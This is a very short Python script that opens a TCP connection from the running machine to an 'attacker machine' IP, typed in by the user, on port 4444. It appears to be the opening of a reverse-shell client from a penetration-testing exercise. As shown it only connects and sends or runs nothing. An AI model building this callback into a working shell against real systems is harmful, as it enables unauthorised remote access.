#!/usr/bin/env python

import socket

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
kali_ip = input('What is the IP of the attacker machine? \n')
connection.connect((kali_ip, 4444))